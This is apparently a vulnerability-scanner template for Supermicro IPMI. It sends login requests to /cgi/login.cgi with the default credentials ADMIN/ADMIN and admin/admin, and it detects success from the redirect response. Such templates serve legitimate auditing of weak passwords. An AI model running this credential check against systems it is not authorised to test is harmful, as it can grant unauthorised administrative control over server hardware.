id: supermicro-default-login

info:
  name: Supermicro Ipmi 默认管理员登录（弱口令）
  author: For3stCo1d
  severity: high
  description: 该模板通过尝试 Supermicro Ipmi 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.gearprimer.com/wiki/supermicro-ipmi-default-username-pasword/
  metadata:
    max-request: 2
  tags: supermicro,default-login,vuln

http:
  - raw:
      - |
        POST /cgi/login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        name={{user}}&pwd={{pass}}

    attack: pitchfork
    payloads:
      user:
        - ADMIN
        - admin
      pass:
        - ADMIN
        - admin
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'self.location='
          - '/cgi/url_redirect.cgi?url_name=mainmenu'
        condition: and

      - type: status
        status:
          - 200
